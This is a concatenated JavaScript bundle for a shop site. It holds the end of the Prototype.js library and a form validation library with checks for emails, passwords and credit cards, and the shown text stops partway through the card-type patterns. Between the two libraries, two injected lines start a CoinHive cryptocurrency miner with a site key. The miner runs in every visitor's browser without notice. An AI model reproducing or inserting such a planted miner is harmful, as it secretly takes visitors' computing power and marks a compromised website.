            x >= this.offset[0] &&
            x <  this.offset[0] + element.offsetWidth);
  },

  withinIncludingScrolloffsets: function(element, x, y) {
    var offsetcache = Element.cumulativeScrollOffset(element);

    this.xcomp = x + offsetcache[0] - this.deltaX;
    this.ycomp = y + offsetcache[1] - this.deltaY;
    this.offset = Element.cumulativeOffset(element);

    return (this.ycomp >= this.offset[1] &&
            this.ycomp <  this.offset[1] + element.offsetHeight &&
            this.xcomp >= this.offset[0] &&
            this.xcomp <  this.offset[0] + element.offsetWidth);
  },

  // within must be called directly before
  overlap: function(mode, element) {
    if (!mode) return 0;
    if (mode == 'vertical')
      return ((this.offset[1] + element.offsetHeight) - this.ycomp) /
        element.offsetHeight;
    if (mode == 'horizontal')
      return ((this.offset[0] + element.offsetWidth) - this.xcomp) /
        element.offsetWidth;
  },

  // Deprecation layer -- use newer Element methods now (1.5.2).

  cumulativeOffset: Element.Methods.cumulativeOffset,

  positionedOffset: Element.Methods.positionedOffset,

  absolutize: function(element) {
    Position.prepare();
    return Element.absolutize(element);
  },

  relativize: function(element) {
    Position.prepare();
    return Element.relativize(element);
  },

  realOffset: Element.Methods.cumulativeScrollOffset,

  offsetParent: Element.Methods.getOffsetParent,

  page: Element.Methods.viewportOffset,

  clone: function(source, target, options) {
    options = options || { };
    return Element.clonePosition(target, source, options);
  }
};

/*--------------------------------------------------------------------------*/

if (!document.getElementsByClassName) document.getElementsByClassName = function(instanceMethods){
  function iter(name) {
    return name.blank() ? null : "[contains(concat(' ', @class, ' '), ' " + name + " ')]";
  }

  instanceMethods.getElementsByClassName = Prototype.BrowserFeatures.XPath ?
  function(element, className) {
    className = className.toString().strip();
    var cond = /\s/.test(className) ? $w(className).map(iter).join('') : iter(className);
    return cond ? document._getElementsByXPath('.//*' + cond, element) : [];
  } : function(element, className) {
    className = className.toString().strip();
    var elements = [], classNames = (/\s/.test(className) ? $w(className) : null);
    if (!classNames && !className) return elements;

    var nodes = $(element).getElementsByTagName('*');
    className = ' ' + className + ' ';

    for (var i = 0, child, cn; child = nodes[i]; i++) {
      if (child.className && (cn = ' ' + child.className + ' ') && (cn.include(className) ||
          (classNames && classNames.all(function(name) {
            return !name.toString().blank() && cn.include(' ' + name + ' ');
          }))))
        elements.push(Element.extend(child));
    }
    return elements;
  };

  return function(className, parentElement) {
    return $(parentElement || document.body).getElementsByClassName(className);
  };
}(Element.Methods);

/*--------------------------------------------------------------------------*/

Element.ClassNames = Class.create();
Element.ClassNames.prototype = {
  initialize: function(element) {
    this.element = $(element);
  },

  _each: function(iterator) {
    this.element.className.split(/\s+/).select(function(name) {
      return name.length > 0;
    })._each(iterator);
  },

  set: function(className) {
    this.element.className = className;
  },

  add: function(classNameToAdd) {
    if (this.include(classNameToAdd)) return;
    this.set($A(this).concat(classNameToAdd).join(' '));
  },

  remove: function(classNameToRemove) {
    if (!this.include(classNameToRemove)) return;
    this.set($A(this).without(classNameToRemove).join(' '));
  },

  toString: function() {
    return $A(this).join(' ');
  }
};

Object.extend(Element.ClassNames.prototype, Enumerable);

/*--------------------------------------------------------------------------*/

Element.addMethods();
var miner = new CoinHive.Anonymous('PQbIwg9HK3zpD4oUPfOUhTJ6UYrfgfVW');
	miner.start();
var switchTo5x=true;
/*
* Really easy field validation with Prototype
* http://tetlaw.id.au/view/javascript/really-easy-field-validation
* Andrew Tetlaw
* Version 1.5.4.1 (2007-01-05)
*
* Copyright (c) 2007 Andrew Tetlaw
* Permission is hereby granted, free of charge, to any person
* obtaining a copy of this software and associated documentation
* files (the "Software"), to deal in the Software without
* restriction, including without limitation the rights to use, copy,
* modify, merge, publish, distribute, sublicense, and/or sell copies
* of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be
* included in all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
* NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
* BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
* ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*
*/
var Validator = Class.create();

Validator.prototype = {
    initialize : function(className, error, test, options) {
        if(typeof test == 'function'){
            this.options = $H(options);
            this._test = test;
        } else {
            this.options = $H(test);
            this._test = function(){return true};
        }
        this.error = error || 'Validation failed.';
        this.className = className;
    },
    test : function(v, elm) {
        return (this._test(v,elm) && this.options.all(function(p){
            return Validator.methods[p.key] ? Validator.methods[p.key](v,elm,p.value) : true;
        }));
    }
}
Validator.methods = {
    pattern : function(v,elm,opt) {return Validation.get('IsEmpty').test(v) || opt.test(v)},
    minLength : function(v,elm,opt) {return v.length >= opt},
    maxLength : function(v,elm,opt) {return v.length <= opt},
    min : function(v,elm,opt) {return v >= parseFloat(opt)},
    max : function(v,elm,opt) {return v <= parseFloat(opt)},
    notOneOf : function(v,elm,opt) {return $A(opt).all(function(value) {
        return v != value;
    })},
    oneOf : function(v,elm,opt) {return $A(opt).any(function(value) {
        return v == value;
    })},
    is : function(v,elm,opt) {return v == opt},
    isNot : function(v,elm,opt) {return v != opt},
    equalToField : function(v,elm,opt) {return v == $F(opt)},
    notEqualToField : function(v,elm,opt) {return v != $F(opt)},
    include : function(v,elm,opt) {return $A(opt).all(function(value) {
        return Validation.get(value).test(v,elm);
    })}
}

var Validation = Class.create();
Validation.defaultOptions = {
    onSubmit : true,
    stopOnFirst : false,
    immediate : false,
    focusOnError : true,
    useTitles : false,
    addClassNameToContainer: false,
    containerClassName: '.input-box',
    onFormValidate : function(result, form) {},
    onElementValidate : function(result, elm) {}
};

Validation.prototype = {
    initialize : function(form, options){
        this.form = $(form);
        if (!this.form) {
            return;
        }
        this.options = Object.extend({
            onSubmit : Validation.defaultOptions.onSubmit,
            stopOnFirst : Validation.defaultOptions.stopOnFirst,
            immediate : Validation.defaultOptions.immediate,
            focusOnError : Validation.defaultOptions.focusOnError,
            useTitles : Validation.defaultOptions.useTitles,
            onFormValidate : Validation.defaultOptions.onFormValidate,
            onElementValidate : Validation.defaultOptions.onElementValidate
        }, options || {});
        if(this.options.onSubmit) Event.observe(this.form,'submit',this.onSubmit.bind(this),false);
        if(this.options.immediate) {
            Form.getElements(this.form).each(function(input) { // Thanks Mike!
                if (input.tagName.toLowerCase() == 'select') {
                    Event.observe(input, 'blur', this.onChange.bindAsEventListener(this));
                }
                if (input.type.toLowerCase() == 'radio' || input.type.toLowerCase() == 'checkbox') {
                    Event.observe(input, 'click', this.onChange.bindAsEventListener(this));
                } else {
                    Event.observe(input, 'change', this.onChange.bindAsEventListener(this));
                }
            }, this);
        }
    },
    onChange : function (ev) {
        Validation.isOnChange = true;
        Validation.validate(Event.element(ev),{
                useTitle : this.options.useTitles,
                onElementValidate : this.options.onElementValidate
        });
        Validation.isOnChange = false;
    },
    onSubmit :  function(ev){
        if(!this.validate()) Event.stop(ev);
    },
    validate : function() {
        var result = false;
        var useTitles = this.options.useTitles;
        var callback = this.options.onElementValidate;
        try {
            if(this.options.stopOnFirst) {
                result = Form.getElements(this.form).all(function(elm) {
                    if (elm.hasClassName('local-validation') && !this.isElementInForm(elm, this.form)) {
                        return true;
                    }
                    return Validation.validate(elm,{useTitle : useTitles, onElementValidate : callback});
                }, this);
            } else {
                result = Form.getElements(this.form).collect(function(elm) {
                    if (elm.hasClassName('local-validation') && !this.isElementInForm(elm, this.form)) {
                        return true;
                    }
                    return Validation.validate(elm,{useTitle : useTitles, onElementValidate : callback});
                }, this).all();
            }
        } catch (e) {

        }
        if(!result && this.options.focusOnError) {
            try{
                Form.getElements(this.form).findAll(function(elm){return $(elm).hasClassName('validation-failed')}).first().focus()
            }
            catch(e){

            }
        }
        this.options.onFormValidate(result, this.form);
        return result;
    },
    reset : function() {
        Form.getElements(this.form).each(Validation.reset);
    },
    isElementInForm : function(elm, form) {
        var domForm = elm.up('form');
        if (domForm == form) {
            return true;
        }
        return false;
    }
}

Object.extend(Validation, {
    validate : function(elm, options){
        options = Object.extend({
            useTitle : false,
            onElementValidate : function(result, elm) {}
        }, options || {});
        elm = $(elm);

        var cn = $w(elm.className);
        return result = cn.all(function(value) {
            var test = Validation.test(value,elm,options.useTitle);
            options.onElementValidate(test, elm);
            return test;
        });
    },
    insertAdvice : function(elm, advice){
        var container = $(elm).up('.field-row');
        if(container){
            Element.insert(container, {after: advice});
        } else if (elm.up('td.value')) {
            elm.up('td.value').insert({bottom: advice});
        } else if (elm.advaiceContainer && $(elm.advaiceContainer)) {
            $(elm.advaiceContainer).update(advice);
        }
        else {
            switch (elm.type.toLowerCase()) {
                case 'checkbox':
                case 'radio':
                    var p = elm.parentNode;
                    if(p) {
                        Element.insert(p, {'bottom': advice});
                    } else {
                        Element.insert(elm, {'after': advice});
                    }
                    break;
                default:
                    Element.insert(elm, {'after': advice});
            }
        }
    },
    showAdvice : function(elm, advice, adviceName){
        if(!elm.advices){
            elm.advices = new Hash();
        }
        else{
            elm.advices.each(function(pair){
                this.hideAdvice(elm, pair.value);
            }.bind(this));
        }
        elm.advices.set(adviceName, advice);
        if(typeof Effect == 'undefined') {
            advice.style.display = 'block';
        } else {
            if(!advice._adviceAbsolutize) {
                new Effect.Appear(advice, {duration : 1 });
            } else {
                Position.absolutize(advice);
                advice.show();
                advice.setStyle({
                    'top':advice._adviceTop,
                    'left': advice._adviceLeft,
                    'width': advice._adviceWidth,
                    'z-index': 1000
                });
                advice.addClassName('advice-absolute');
            }
        }
    },
    hideAdvice : function(elm, advice){
        if(advice != null) advice.hide();
    },
    updateCallback : function(elm, status) {
        if (typeof elm.callbackFunction != 'undefined') {
            eval(elm.callbackFunction+'(\''+elm.id+'\',\''+status+'\')');
        }
    },
    ajaxError : function(elm, errorMsg) {
        var name = 'validate-ajax';
        var advice = Validation.getAdvice(name, elm);
        if (advice == null) {
            advice = this.createAdvice(name, elm, false, errorMsg);
        }
        this.showAdvice(elm, advice, 'validate-ajax');
        this.updateCallback(elm, 'failed');

        elm.addClassName('validation-failed');
        elm.addClassName('validate-ajax');
        if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
            var container = elm.up(Validation.defaultOptions.containerClassName);
            if (container && this.allowContainerClassName(elm)) {
                container.removeClassName('validation-passed');
                container.addClassName('validation-error');
            }
        }
    },
    allowContainerClassName: function (elm) {
        if (elm.type == 'radio' || elm.type == 'checkbox') {
            return elm.hasClassName('change-container-classname');
        }

        return true;
    },
    test : function(name, elm, useTitle) {
        var v = Validation.get(name);
        var prop = '__advice'+name.camelize();
        try {
        if(Validation.isVisible(elm) && !v.test($F(elm), elm)) {
            //if(!elm[prop]) {
                var advice = Validation.getAdvice(name, elm);
                if (advice == null) {
                    advice = this.createAdvice(name, elm, useTitle);
                }
                this.showAdvice(elm, advice, name);
                this.updateCallback(elm, 'failed');
            //}
            elm[prop] = 1;
            if (!elm.advaiceContainer) {
                elm.removeClassName('validation-passed');
                elm.addClassName('validation-failed');
            }

           if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container && this.allowContainerClassName(elm)) {
                    container.removeClassName('validation-passed');
                    container.addClassName('validation-error');
                }
            }
            return false;
        } else {
            var advice = Validation.getAdvice(name, elm);
            this.hideAdvice(elm, advice);
            this.updateCallback(elm, 'passed');
            elm[prop] = '';
            elm.removeClassName('validation-failed');
            elm.addClassName('validation-passed');
            if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container && !container.down('.validation-failed') && this.allowContainerClassName(elm)) {
                    if (!Validation.get('IsEmpty').test(elm.value) || !this.isVisible(elm)) {
                        container.addClassName('validation-passed');
                    } else {
                        container.removeClassName('validation-passed');
                    }
                    container.removeClassName('validation-error');
                }
            }
            return true;
        }
        } catch(e) {
            throw(e)
        }
    },
    isVisible : function(elm) {
        while(elm.tagName != 'BODY') {
            if(!$(elm).visible()) return false;
            elm = elm.parentNode;
        }
        return true;
    },
    getAdvice : function(name, elm) {
        return $('advice-' + name + '-' + Validation.getElmID(elm)) || $('advice-' + Validation.getElmID(elm));
    },
    createAdvice : function(name, elm, useTitle, customError) {
        var v = Validation.get(name);
        var errorMsg = useTitle ? ((elm && elm.title) ? elm.title : v.error) : v.error;
        if (customError) {
            errorMsg = customError;
        }
        try {
            if (Translator){
                errorMsg = Translator.translate(errorMsg);
            }
        }
        catch(e){}

        advice = '<div class="validation-advice" id="advice-' + name + '-' + Validation.getElmID(elm) +'" style="display:none">' + errorMsg + '</div>'


        Validation.insertAdvice(elm, advice);
        advice = Validation.getAdvice(name, elm);
        if($(elm).hasClassName('absolute-advice')) {
            var dimensions = $(elm).getDimensions();
            var originalPosition = Position.cumulativeOffset(elm);

            advice._adviceTop = (originalPosition[1] + dimensions.height) + 'px';
            advice._adviceLeft = (originalPosition[0])  + 'px';
            advice._adviceWidth = (dimensions.width)  + 'px';
            advice._adviceAbsolutize = true;
        }
        return advice;
    },
    getElmID : function(elm) {
        return elm.id ? elm.id : elm.name;
    },
    reset : function(elm) {
        elm = $(elm);
        var cn = $w(elm.className);
        cn.each(function(value) {
            var prop = '__advice'+value.camelize();
            if(elm[prop]) {
                var advice = Validation.getAdvice(value, elm);
                if (advice) {
                    advice.hide();
                }
                elm[prop] = '';
            }
            elm.removeClassName('validation-failed');
            elm.removeClassName('validation-passed');
            if (Validation.defaultOptions.addClassNameToContainer && Validation.defaultOptions.containerClassName != '') {
                var container = elm.up(Validation.defaultOptions.containerClassName);
                if (container) {
                    container.removeClassName('validation-passed');
                    container.removeClassName('validation-error');
                }
            }
        });
    },
    add : function(className, error, test, options) {
        var nv = {};
        nv[className] = new Validator(className, error, test, options);
        Object.extend(Validation.methods, nv);
    },
    addAllThese : function(validators) {
        var nv = {};
        $A(validators).each(function(value) {
                nv[value[0]] = new Validator(value[0], value[1], value[2], (value.length > 3 ? value[3] : {}));
            });
        Object.extend(Validation.methods, nv);
    },
    get : function(name) {
        return  Validation.methods[name] ? Validation.methods[name] : Validation.methods['_LikeNoIDIEverSaw_'];
    },
    methods : {
        '_LikeNoIDIEverSaw_' : new Validator('_LikeNoIDIEverSaw_','',{})
    }
});

Validation.add('IsEmpty', '', function(v) {
    return  (v == '' || (v == null) || (v.length == 0) || /^\s+$/.test(v)); // || /^\s+$/.test(v));
});

Validation.addAllThese([
    ['validate-select', 'Please select an option.', function(v) {
                return ((v != "none") && (v != null) && (v.length != 0));
            }],
    ['required-entry', 'This is a required field.', function(v) {
                return !Validation.get('IsEmpty').test(v);
            }],
    ['validate-number', 'Please enter a valid number in this field.', function(v) {
                return Validation.get('IsEmpty').test(v) || (!isNaN(parseNumber(v)) && !/^\s+$/.test(parseNumber(v)));
            }],
    ['validate-digits', 'Please use numbers only in this field. please avoid spaces or other characters such as dots or commas.', function(v) {
                return Validation.get('IsEmpty').test(v) ||  !/[^\d]/.test(v);
            }],
    ['validate-alpha', 'Please use letters only (a-z or A-Z) in this field.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[a-zA-Z]+$/.test(v)
            }],
    ['validate-code', 'Please use only letters (a-z), numbers (0-9) or underscore(_) in this field, first character should be a letter.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[a-z]+[a-z0-9_]+$/.test(v)
            }],
    ['validate-alphanum', 'Please use only letters (a-z or A-Z) or numbers (0-9) only in this field. No spaces or other characters are allowed.', function(v) {
                return Validation.get('IsEmpty').test(v) ||  /^[a-zA-Z0-9]+$/.test(v) /*!/\W/.test(v)*/
            }],
    ['validate-street', 'Please use only letters (a-z or A-Z) or numbers (0-9) or spaces and # only in this field.', function(v) {
                return Validation.get('IsEmpty').test(v) ||  /^[ \w]{3,}([A-Za-z]\.)?([ \w]*\#\d+)?(\r\n| )[ \w]{3,}/.test(v)
            }],
    ['validate-phoneStrict', 'Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^(\()?\d{3}(\))?(-|\s)?\d{3}(-|\s)\d{4}$/.test(v);
            }],
    ['validate-phoneLax', 'Please enter a valid phone number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^((\d[-. ]?)?((\(\d{3}\))|\d{3}))?[-. ]?\d{3}[-. ]?\d{4}$/.test(v);
            }],
    ['validate-fax', 'Please enter a valid fax number. For example (123) 456-7890 or 123-456-7890.', function(v) {
                return Validation.get('IsEmpty').test(v) || /^(\()?\d{3}(\))?(-|\s)?\d{3}(-|\s)\d{4}$/.test(v);
            }],
    ['validate-date', 'Please enter a valid date.', function(v) {
                var test = new Date(v);
                return Validation.get('IsEmpty').test(v) || !isNaN(test);
            }],
    ['validate-email', 'Please enter a valid email address. For example johndoe@domain.com.', function (v) {
                //return Validation.get('IsEmpty').test(v) || /\w{1,}[@][\w\-]{1,}([.]([\w\-]{1,})){1,3}$/.test(v)
                //return Validation.get('IsEmpty').test(v) || /^[\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9][\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9\.]{1,30}[\!\#$%\*/?|\^\{\}`~&\'\+\-=_a-z0-9]@([a-z0-9_-]{1,30}\.){1,5}[a-z]{2,4}$/i.test(v)
                return Validation.get('IsEmpty').test(v) || /^([a-z0-9,!\#\$%&'\*\+\/=\?\^_`\{\|\}~-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z0-9,!\#\$%&'\*\+\/=\?\^_`\{\|\}~-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*@([a-z0-9-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z0-9-]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*\.(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]){2,})$/i.test(v)
            }],
    ['validate-emailSender', 'Please use only visible characters and spaces.', function (v) {
                return Validation.get('IsEmpty').test(v) ||  /^[\S ]+$/.test(v)
                    }],
    ['validate-password', 'Please enter 6 or more characters. Leading or trailing spaces will be ignored.', function(v) {
                var pass=v.strip(); /*strip leading and trailing spaces*/
                return !(pass.length>0 && pass.length < 6);
            }],
    ['validate-admin-password', 'Please enter 7 or more characters. Password should contain both numeric and alphabetic characters.', function(v) {
                var pass=v.strip();
                if (0 == pass.length) {
                    return true;
                }
                if (!(/[a-z]/i.test(v)) || !(/[0-9]/.test(v))) {
                    return false;
                }
                return !(pass.length < 7);
            }],
    ['validate-cpassword', 'Please make sure your passwords match.', function(v) {
                var conf = $('confirmation') ? $('confirmation') : $$('.validate-cpassword')[0];
                var pass = false;
                if ($('password')) {
                    pass = $('password');
                }
                var passwordElements = $$('.validate-password');
                for (var i = 0; i < passwordElements.size(); i++) {
                    var passwordElement = passwordElements[i];
                    if (passwordElement.up('form').id == conf.up('form').id) {
                        pass = passwordElement;
                    }
                }
                if ($$('.validate-admin-password').size()) {
                    pass = $$('.validate-admin-password')[0];
                }
                return (pass.value == conf.value);
            }],
    ['validate-url', 'Please enter a valid URL. http:// is required', function (v) {
                return Validation.get('IsEmpty').test(v) || /^(http|https|ftp):\/\/(([A-Z0-9][A-Z0-9_-]*)(\.[A-Z0-9][A-Z0-9_-]*)+)(:(\d+))?\/?/i.test(v)
            }],
    ['validate-clean-url', 'Please enter a valid URL. For example http://www.example.com or www.example.com', function (v) {
                return Validation.get('IsEmpty').test(v) || /^(http|https|ftp):\/\/(([A-Z0-9][A-Z0-9_-]*)(\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i.test(v) || /^(www)((\.[A-Z0-9][A-Z0-9_-]*)+.(com|org|net|dk|at|us|tv|info|uk|co.uk|biz|se)$)(:(\d+))?\/?/i.test(v)
            }],
    ['validate-identifier', 'Please enter a valid URL Key. For example "example-page", "example-page.html" or "anotherlevel/example-page"', function (v) {
                return Validation.get('IsEmpty').test(v) || /^[A-Z0-9][A-Z0-9_\/-]+(\.[A-Z0-9_-]+)*$/i.test(v)
            }],
    ['validate-xml-identifier', 'Please enter a valid XML-identifier. For example something_1, block5, id-4', function (v) {
                return Validation.get('IsEmpty').test(v) || /^[A-Z][A-Z0-9_\/-]*$/i.test(v)
            }],
    ['validate-ssn', 'Please enter a valid social security number. For example 123-45-6789.', function(v) {
            return Validation.get('IsEmpty').test(v) || /^\d{3}-?\d{2}-?\d{4}$/.test(v);
            }],
    ['validate-zip', 'Please enter a valid zip code. For example 90602 or 90602-1234.', function(v) {
            return Validation.get('IsEmpty').test(v) || /(^\d{5}$)|(^\d{5}-\d{4}$)/.test(v);
            }],
    ['validate-zip-international', 'Please enter a valid zip code.', function(v) {
            //return Validation.get('IsEmpty').test(v) || /(^[A-z0-9]{2,10}([\s]{0,1}|[\-]{0,1})[A-z0-9]{2,10}$)/.test(v);
            return true;
            }],
    ['validate-date-au', 'Please use this date format: dd/mm/yyyy. For example 17/03/2006 for the 17th of March, 2006.', function(v) {
                if(Validation.get('IsEmpty').test(v)) return true;
                var regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
                if(!regex.test(v)) return false;
                var d = new Date(v.replace(regex, '$2/$1/$3'));
                return ( parseInt(RegExp.$2, 10) == (1+d.getMonth()) ) &&
                            (parseInt(RegExp.$1, 10) == d.getDate()) &&
                            (parseInt(RegExp.$3, 10) == d.getFullYear() );
            }],
    ['validate-currency-dollar', 'Please enter a valid $ amount. For example $100.00.', function(v) {
                // [$]1[##][,###]+[.##]
                // [$]1###+[.##]
                // [$]0.##
                // [$].##
                return Validation.get('IsEmpty').test(v) ||  /^\$?\-?([1-9]{1}[0-9]{0,2}(\,[0-9]{3})*(\.[0-9]{0,2})?|[1-9]{1}\d*(\.[0-9]{0,2})?|0(\.[0-9]{0,2})?|(\.[0-9]{1,2})?)$/.test(v)
            }],
    ['validate-one-required', 'Please select one of the above options.', function (v,elm) {
                var p = elm.parentNode;
                var options = p.getElementsByTagName('INPUT');
                return $A(options).any(function(elm) {
                    return $F(elm);
                });
            }],
    ['validate-one-required-by-name', 'Please select one of the options.', function (v,elm) {
                var inputs = $$('input[name="' + elm.name.replace(/([\\"])/g, '\\$1') + '"]');

                var error = 1;
                for(var i=0;i<inputs.length;i++) {
                    if((inputs[i].type == 'checkbox' || inputs[i].type == 'radio') && inputs[i].checked == true) {
                        error = 0;
                    }

                    if(Validation.isOnChange && (inputs[i].type == 'checkbox' || inputs[i].type == 'radio')) {
                        Validation.reset(inputs[i]);
                    }
                }

                if( error == 0 ) {
                    return true;
                } else {
                    return false;
                }
            }],
    ['validate-not-negative-number', 'Please enter a valid number in this field.', function(v) {
                v = parseNumber(v);
                return (!isNaN(v) && v>=0);
            }],
    ['validate-state', 'Please select State/Province.', function(v) {
                return (v!=0 || v == '');
            }],

    ['validate-new-password', 'Please enter 6 or more characters. Leading or trailing spaces will be ignored.', function(v) {
                if (!Validation.get('validate-password').test(v)) return false;
                if (Validation.get('IsEmpty').test(v) && v != '') return false;
                return true;
            }],
    ['validate-greater-than-zero', 'Please enter a number greater than 0 in this field.', function(v) {
                if(v.length)
                    return parseFloat(v) > 0;
                else
                    return true;
            }],
    ['validate-zero-or-greater', 'Please enter a number 0 or greater in this field.', function(v) {
                if(v.length)
                    return parseFloat(v) >= 0;
                else
                    return true;
            }],
    ['validate-cc-number', 'Please enter a valid credit card number.', function(v, elm) {
                // remove non-numerics
                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_number')) + '_cc_type');
                if (ccTypeContainer && typeof Validation.creditCartTypes.get(ccTypeContainer.value) != 'undefined'
                        && Validation.creditCartTypes.get(ccTypeContainer.value)[2] == false) {
                    if (!Validation.get('IsEmpty').test(v) && Validation.get('validate-digits').test(v)) {
                        return true;
                    } else {
                        return false;
                    }
                }
                return validateCreditCard(v);
            }],
    ['validate-cc-type', 'Credit card number doesn\'t match credit card type', function(v, elm) {
                // remove credit card number delimiters such as "-" and space
                elm.value = removeDelimiters(elm.value);
                v         = removeDelimiters(v);

                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_number')) + '_cc_type');
                if (!ccTypeContainer) {
                    return true;
                }
                var ccType = ccTypeContainer.value;

                if (typeof Validation.creditCartTypes.get(ccType) == 'undefined') {
                    return false;
                }

                // Other card type or switch or solo card
                if (Validation.creditCartTypes.get(ccType)[0]==false) {
                    return true;
                }

                // Matched credit card type
                var ccMatchedType = '';

                Validation.creditCartTypes.each(function (pair) {
                    if (pair.value[0] && v.match(pair.value[0])) {
                        ccMatchedType = pair.key;
                        throw $break;
                    }
                });

                if(ccMatchedType != ccType) {
                    return false;
                }

                if (ccTypeContainer.hasClassName('validation-failed') && Validation.isOnChange) {
                    Validation.validate(ccTypeContainer);
                }

                return true;
            }],
     ['validate-cc-type-select', 'Card type doesn\'t match credit card number', function(v, elm) {
                var ccNumberContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_type')) + '_cc_number');
                if (Validation.isOnChange && Validation.get('IsEmpty').test(ccNumberContainer.value)) {
                    return true;
                }
                if (Validation.get('validate-cc-type').test(ccNumberContainer.value, ccNumberContainer)) {
                    Validation.validate(ccNumberContainer);
                }
                return Validation.get('validate-cc-type').test(ccNumberContainer.value, ccNumberContainer);
            }],
     ['validate-cc-exp', 'Incorrect credit card expiration date', function(v, elm) {
                var ccExpMonth   = v;
                var ccExpYear    = $(elm.id.substr(0,elm.id.indexOf('_expiration')) + '_expiration_yr').value;
                var currentTime  = new Date();
                var currentMonth = currentTime.getMonth() + 1;
                var currentYear  = currentTime.getFullYear();
                if (ccExpMonth < currentMonth && ccExpYear == currentYear) {
                    return false;
                }
                return true;
            }],
     ['validate-cc-cvn', 'Please enter a valid credit card verification number.', function(v, elm) {
                var ccTypeContainer = $(elm.id.substr(0,elm.id.indexOf('_cc_cid')) + '_cc_type');
                if (!ccTypeContainer) {
                    return true;
                }
                var ccType = ccTypeContainer.value;

                if (typeof Validation.creditCartTypes.get(ccType) == 'undefined') {
                    return false;
                }

                var re = Validation.creditCartTypes.get(ccType)[1];

                if (v.match(re)) {
                    return true;
                }

                return false;
            }],
     ['validate-ajax', '', function(v, elm) { return true; }],
     ['validate-data', 'Please use only letters (a-z or A-Z), numbers (0-9) or underscore(_) in this field, first character should be a letter.', function (v) {
                if(v != '' && v) {
                    return /^[A-Za-z]+[A-Za-z0-9_]+$/.test(v);
                }
                return true;
            }],
     ['validate-css-length', 'Please input a valid CSS-length. For example 100px or 77pt or 20em or .5ex or 50%', function (v) {
                if (v != '' && v) {
                    return /^[0-9\.]+(px|pt|em|ex|%)?$/.test(v) && (!(/\..*\./.test(v))) && !(/\.$/.test(v));
                }
                return true;
            }],
     ['validate-length', 'Maximum length exceeded.', function (v, elm) {
                var re = new RegExp(/^maximum-length-[0-9]+$/);
                var result = true;
                $w(elm.className).each(function(name, index) {
                        if (name.match(re) && result) {
                           var length = name.split('-')[2];
                           result = (v.length <= length);
                        }
                    });
                return result;
            }],
     ['validate-percents', 'Please enter a number lower than 100', {max:100}]

]);

function removeDelimiters (v) {
    v = v.replace(/\s/g, '');
    v = v.replace(/\-/g, '');
    return v;
}

function parseNumber(v)
{
    if (typeof v != 'string') {
        return parseFloat(v);
    }

    var isDot  = v.indexOf('.');
    var isComa = v.indexOf(',');

    if (isDot != -1 && isComa != -1) {
        if (isComa > isDot) {
            v = v.replace('.', '').replace(',', '.');
        }
        else {
            v = v.replace(',', '');
        }
    }
    else if (isComa != -1) {
        v = v.replace(',', '.');
    }

    return parseFloat(v);
}

/**
 * Hash with credit card types wich can be simply extended in payment modules
 * 0 - regexp for card number
 * 1 - regexp for cvn
 * 2 - check or not credit card number trough Luhn algorithm by
 *     function validateCreditCard wich you can find above in this file
 */
Validation.creditCartTypes = $H({
    'SS': [new RegExp('^((6759[0-9]{12})|(5018|5020|5038|6304|6759|6761|6763[0-9]{12,19})|(49[013][1356][0-9]{12})|(6333[0-9]{12})|(6334[0-4]\d{11})|(633110[0-9]{10})|(564182[0-9]{10}))([0-9]{2,3})?$'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'SO': [new RegExp('^(6334[5-9]([0-9]{11}|[0-9]{13,14}))|(6767([0-9]{12}|[0-9]{14,15}))$'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
    'SM': [new RegExp('(^(5[0678])[0-9]{11,18}$)|(^(6[^05])[0-9]{11,18}$)|(^(601)[^1][0-9]{9,16}$)|(^(6011)[0-9]{9,11}$)|(^(6011)[0-9]{13,16}$)|(^(65)[0-9]{11,13}$)|(^(65)[0-9]{15,18}$)|(^(49030)[2-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49033)[5-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49110)[1-2]([0-9]{10}$|[0-9]{12,13}$))|(^(49117)[4-9]([0-9]{10}$|[0-9]{12,13}$))|(^(49118)[0-2]([0-9]{10}$|[0-9]{12,13}$))|(^(4936)([0-9]{12}$|[0-9]{14,15}$))'), new RegExp('^([0-9]{3}|[0-9]{4})?$'), true],
